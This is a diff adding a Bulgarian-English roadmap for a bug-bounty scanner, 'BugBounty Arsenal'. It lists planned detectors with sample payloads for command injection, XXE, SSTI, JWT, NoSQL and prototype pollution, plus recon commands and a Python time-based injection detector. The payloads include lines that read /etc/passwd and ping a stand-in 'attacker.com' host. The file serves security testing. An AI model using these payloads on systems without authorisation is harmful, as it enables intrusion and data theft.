@@ -1,0 +1,466 @@
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                                                                           ║
+║     🚀 BUGBOUNTY ARSENAL - ROADMAP ЗА НОВИ ДЕТЕКТОРИ И ТЕХНИКИ          ║
+║                                                                           ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+═══════════════════════════════════════════════════════════════════════════
+🎯 ПРИОРИТЕТНИ НОВИ ДЕТЕКТОРИ (High Impact, High Reward)
+═══════════════════════════════════════════════════════════════════════════
+
+1. 🔥 COMMAND INJECTION DETECTOR
+   💰 Reward: $2000-10000+
+   📊 Difficulty: Medium
+   🎯 Why: Много common, високи награди
+   
+   Техники:
+   • Test за `;`, `|`, `&&`, `||`, backticks
+   • Payload: `; whoami`, `| ping -c 3 attacker.com`
+   • Time-based detection (sleep 10)
+   • DNS exfiltration (ping randomid.burpcollaborator.net)
+   
+   Примерни payloads:
+   - url?cmd=test; sleep 5
+   - url?file=test.txt | cat /etc/passwd
+   - url?input=`whoami`
+
+2. 🔥 XXE (XML EXTERNAL ENTITY) DETECTOR
+   💰 Reward: $1000-5000+
+   📊 Difficulty: Medium
+   🎯 Why: Често пропускан, critical impact
+   
+   Техники:
+   • Detect XML endpoints (Content-Type: application/xml)
+   • Test external entity injection
+   • File disclosure payloads
+   • SSRF via XXE
+   
+   Payload:
+   ```xml
+   <?xml version="1.0"?>
+   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+   <foo>&xxe;</foo>
+   ```
+
+3. 🔥 SSTI (SERVER-SIDE TEMPLATE INJECTION)
+   💰 Reward: $2000-8000+
+   📊 Difficulty: Hard
+   🎯 Why: RCE potential, високи награди
+   
+   Техники:
+   • Test template expressions
+   • Jinja2: {{7*7}} -> 49
+   • Twig: {{7*'7'}} -> 7777777
+   • Freemarker: ${7*7}
+   
+   Detection:
+   - Send mathematical expressions
+   - Check if evaluated in response
+   - Context-specific payloads
+
+4. 🔥 RACE CONDITION DETECTOR
+   💰 Reward: $500-5000+
+   📊 Difficulty: Hard
+   🎯 Why: Рядко тестван, interesting bugs
+   
+   Техники:
+   • Concurrent requests на критични endpoints
+   • Payment endpoints (double spending)
+   • Account creation (bypass limits)
+   • Voucher redemption (use multiple times)
+   
+   Approach:
+   - Send 50-100 concurrent requests
+   - Check for inconsistencies
+   - Monitor transaction IDs
+
+5. 🔥 GRAPHQL INJECTION DETECTOR
+   💰 Reward: $1000-5000+
+   📊 Difficulty: Medium
+   🎯 Why: Много apps използват GraphQL
+   
+   Техники:
+   • Introspection queries (schema disclosure)
+   • Depth limit bypass
+   • Batch query attacks
+   • Authorization bypass
+   
+   Payloads:
+   ```graphql
+   {__schema{types{name,fields{name}}}}
+   query{users{id,email,password}}
+   ```
+
+6. 🔥 JWT (JSON WEB TOKEN) VULNERABILITIES
+   💰 Reward: $1000-8000+
+   📊 Difficulty: Medium
+   🎯 Why: Често misconfigured
+   
+   Техники:
+   • Algorithm confusion (RS256 -> HS256)
+   • None algorithm attack
+   • Weak secret brute force
+   • Kid header injection
+   
+   Tests:
+   - Modify algorithm to "none"
+   - Change payload (user_id, role)
+   - SQL injection in kid parameter
+
+7. 🔥 PROTOTYPE POLLUTION (JavaScript)
+   💰 Reward: $500-3000+
+   📊 Difficulty: Hard
+   🎯 Why: Frontend apps, interesting impact
+   
+   Payloads:
+   ```json
+   {"__proto__":{"admin":true}}
+   {"constructor":{"prototype":{"isAdmin":true}}}
+   ```
+
+8. 🔥 NOSQL INJECTION DETECTOR
+   💰 Reward: $1000-5000+
+   📊 Difficulty: Medium
+   🎯 Why: MongoDB apps много popular
+   
+   Payloads:
+   ```
+   username[$ne]=admin&password[$ne]=pass
+   {"username":{"$gt":""},"password":{"$gt":""}}
+   ```
+
+═══════════════════════════════════════════════════════════════════════════
+🛠️ НОВИ ИНСТРУМЕНТИ ЗА ИНТЕГРАЦИЯ
+═══════════════════════════════════════════════════════════════════════════
+
+1. SUBFINDER INTEGRATION
+   🎯 За automatic subdomain enumeration
+   ```bash
+   subfinder -d target.com -o subdomains.txt
+   ```
+   Integration: Auto-generate targets.csv
+
+2. NUCLEI TEMPLATE ENGINE
+   🎯 Хиляди готови templates за CVEs
+   ```bash
+   nuclei -u target.com -t cves/
+   ```
+   Integration: Run nuclei scans automatically
+
+3. HTTPX FOR PROBE
+   🎯 Fast HTTP probing
+   ```bash
+   cat subdomains.txt | httpx -ports 80,443,8080,8443
+   ```
+   Integration: Check live hosts before scanning
+
+4. FFUF/DIRSEARCH INTEGRATION
+   🎯 Directory/file fuzzing
+   ```bash
+   ffuf -u https://target.com/FUZZ -w wordlist.txt
+   ```
+   Integration: Auto-discover hidden endpoints
+
+5. ARJUN PARAMETER DISCOVERY
+   🎯 Find hidden GET/POST parameters
+   ```bash
+   arjun -u https://target.com/api
+   ```
+   Integration: Expand attack surface
+
+6. WAYBACKURLS
+   🎯 Historical URLs from archive.org
+   ```bash
+   waybackurls target.com | grep -v "\.jpg\|\.png\|\.css"
+   ```
+   Integration: Find old/forgotten endpoints
+
+7. GAU (Get All URLs)
+   🎯 Aggregate URLs from multiple sources
+   ```bash
+   gau target.com
+   ```
+   Integration: Better URL discovery
+
+═══════════════════════════════════════════════════════════════════════════
+📊 ADVANCED SCANNING FEATURES
+═══════════════════════════════════════════════════════════════════════════
+
+1. SMART CRAWLING
+   • JavaScript rendering (Playwright/Selenium)
+   • SPA (Single Page Application) support
+   • AJAX request interception
+   • WebSocket discovery
+
+2. AUTHENTICATED SCANNING
+   • Cookie/token management
+   • Multi-user testing (privilege escalation)
+   • Session handling
+   • OAuth flow testing
+
+3. API SECURITY TESTING
+   • OpenAPI/Swagger parsing
+   • REST endpoint discovery
+   • GraphQL introspection
+   • SOAP/XML-RPC testing
+
+4. BUSINESS LOGIC TESTING
+   • Workflow testing (checkout process)
+   • Price manipulation detection
+   • Quantity bypass testing
+   • Payment flow analysis
+
+5. MOBILE API TESTING
+   • Certificate pinning bypass detection
+   • Mobile-specific headers
+   • Deep link testing
+   • Mobile API endpoints
+
+6. CLOUD MISCONFIGURATION
+   • S3 bucket enumeration
+   • Azure blob detection
+   • GCP bucket testing
+   • Exposed cloud services
+
+═══════════════════════════════════════════════════════════════════════════
+🎯 RECONNAISSANCE ENHANCEMENTS
+═══════════════════════════════════════════════════════════════════════════
+
+1. SUBDOMAIN TAKEOVER DETECTOR
+   💰 $500-2000 easy bounties
+   
+   Check:
+   • CNAME pointing to removed services
+   • GitHub Pages, Heroku, AWS S3
+   • Azure, Shopify stores
+   
+   Tools: subjack, SubOver
+
+2. EXPOSED GIT REPOSITORIES
+   💰 $100-1000
+   
+   Check:
+   • /.git/config
+   • /.git/HEAD
+   • Download and analyze repo
+   • Find secrets in commits
+
+3. CLOUD METADATA ENDPOINTS
+   💰 $1000-5000+
+   
+   Check:
+   • AWS: 169.254.169.254/latest/meta-data/
+   • Azure: 169.254.169.254/metadata/instance
+   • GCP: metadata.google.internal
+
+4. CORS MISCONFIGURATION
+   💰 $500-2000
+   
+   Test:
+   • Wildcard origins
+   • Null origin
+   • Reflected origin
+   • Subdomain takeover + CORS
+
+═══════════════════════════════════════════════════════════════════════════
+💡 SMART FEATURES ЗА AUTOMATION
+═══════════════════════════════════════════════════════════════════════════
+
+1. MACHINE LEARNING DETECTION
+   • Train model on valid vs invalid bugs
+   • Reduce false positives
+   • Prioritize interesting findings
+   • Pattern recognition
+
+2. CONTINUOUS MONITORING
+   • Monitor target URLs daily
+   • Alert on new subdomains
+   • Track changes in responses
+   • Detect new endpoints
+
+3. COLLABORATION FEATURES
+   • Team scanning
+   • Shared findings database
+   • Deduplication across team
+   • Knowledge base
+
+4. INTEGRATION WITH BURP SUITE
+   • Export findings to Burp
+   • Import Burp sitemap
+   • Shared session handling
+   • Extension API
+
+5. REPORTING IMPROVEMENTS
+   • Auto-generate PoC videos
+   • Screenshot automation
+   • Impact calculator
+   • CVSS scoring
+
+═══════════════════════════════════════════════════════════════════════════
+🔧 PROPOSED IMPLEMENTATION PLAN
+═══════════════════════════════════════════════════════════════════════════
+
+PHASE 1 (Week 1-2): HIGH PRIORITY DETECTORS
+□ Command Injection detector
+□ XXE detector
+□ JWT vulnerability scanner
+□ NoSQL injection detector
+
+PHASE 2 (Week 3-4): RECONNAISSANCE TOOLS
+□ Subfinder integration
+□ Waybackurls integration
+□ Subdomain takeover detector
+□ CORS misconfiguration detector
+
+PHASE 3 (Week 5-6): ADVANCED FEATURES
+□ SSTI detector
+□ Race condition detector
+□ GraphQL injection
+□ Prototype pollution
+
+PHASE 4 (Week 7-8): AUTOMATION & INTELLIGENCE
+□ Smart crawling (JavaScript)
+□ Authenticated scanning
+□ API security testing
+□ Machine learning filtering
+
+PHASE 5 (Week 9-10): CLOUD & MODERN APPS
+□ Cloud misconfiguration
+□ Mobile API testing
+□ Kubernetes/Docker exposure
+□ Serverless function testing
+
+═══════════════════════════════════════════════════════════════════════════
+📈 EXPECTED IMPACT
+═══════════════════════════════════════════════════════════════════════════
+
+Current BugBounty Arsenal:
+✅ 14 detectors
+📊 Good coverage на basic vulnerabilities
+
+After Phase 1-2 (1 month):
+✅ 20+ detectors
+💰 2x higher chance of finding bugs
+🎯 Coverage на critical high-reward bugs
+
+After Phase 3-4 (2 months):
+✅ 25+ detectors
+💰 3x higher chance
+🤖 Intelligent filtering
+🚀 Semi-automated hunting
+
+After Phase 5 (3 months):
+✅ 30+ detectors
+💰 5x higher chance
+🎯 Full coverage на OWASP Top 10+
+🔥 Professional-grade arsenal
+
+═══════════════════════════════════════════════════════════════════════════
+🏆 TOP 5 FEATURES ЗА IMMEDIATE IMPLEMENTATION
+═══════════════════════════════════════════════════════════════════════════
+
+1. ⭐ COMMAND INJECTION DETECTOR
+   Impact: High | Difficulty: Medium | Time: 2 days
+   → Most requested, high rewards
+
+2. ⭐ JWT VULNERABILITY SCANNER
+   Impact: High | Difficulty: Low | Time: 1 day
+   → Easy to implement, common misconfiguration
+
+3. ⭐ SUBFINDER + HTTPX INTEGRATION
+   Impact: High | Difficulty: Low | Time: 1 day
+   → Better reconnaissance = more targets
+
+4. ⭐ XXE DETECTOR
+   Impact: High | Difficulty: Medium | Time: 2 days
+   → Underutilized, high rewards
+
+5. ⭐ AUTHENTICATED SCANNING
+   Impact: Very High | Difficulty: Medium | Time: 3 days
+   → Opens up whole new class of bugs
+
+═══════════════════════════════════════════════════════════════════════════
+💻 EXAMPLE: COMMAND INJECTION DETECTOR IMPLEMENTATION
+═══════════════════════════════════════════════════════════════════════════
+
+```python
+# detectors/command_injection_detector.py
+
+from detectors.registry import register_active
+import asyncio
+
+@register_active
+async def command_injection_detector(url, session, config):
+    """
+    Detect OS command injection vulnerabilities.
+    
+    Tests for blind and time-based command injection.
+    """
+    findings = []
+    
+    # Time-based payloads (sleep detection)
+    time_payloads = [
+        '; sleep 5',
+        '| sleep 5',
+        '`sleep 5`',
+        '$(sleep 5)',
+        '& timeout 5'
+    ]
+    
+    # Parse URL parameters
+    from urllib.parse import urlparse, parse_qs, urlencode
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    
+    if not params:
+        return findings
+    
+    for param in params:
+        for payload in time_payloads:
+            # Measure response time
+            start = asyncio.get_event_loop().time()
+            
+            test_params = params.copy()
+            test_params[param] = [payload]
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
+            
+            try:
+                async with session.get(test_url, timeout=10) as resp:
+                    elapsed = asyncio.get_event_loop().time() - start
+                    
+                    # If response took ~5 seconds, likely vulnerable
+                    if 4.5 <= elapsed <= 6.0:
+                        findings.append({
+                            'type': 'Command Injection (Time-Based)',
+                            'severity': 'critical',
+                            'confidence': 'high',
+                            'url': test_url,
+                            'parameter': param,
+                            'payload': payload,
+                            'evidence': f'Response delayed by {elapsed:.2f}s',
+                            'impact': 'Remote command execution on server',
+                            'recommendation': 'Sanitize user input, use parameterized commands'
+                        })
+            except:
+                continue
+    
+    return findings
+```
+
+═══════════════════════════════════════════════════════════════════════════
+🚀 READY TO IMPLEMENT?
+═══════════════════════════════════════════════════════════════════════════
+
+Искаш ли да започнем с:
+
+1. Command Injection detector (2 days)
+2. JWT vulnerability scanner (1 day)
+3. Subfinder integration (1 day)
+4. XXE detector (2 days)
+5. Authenticated scanning (3 days)
+
+Или друг детектор от списъка?
+
+Казвай кой искаш първо и ще го имплементираме! 💪
+
+═══════════════════════════════════════════════════════════════════════════
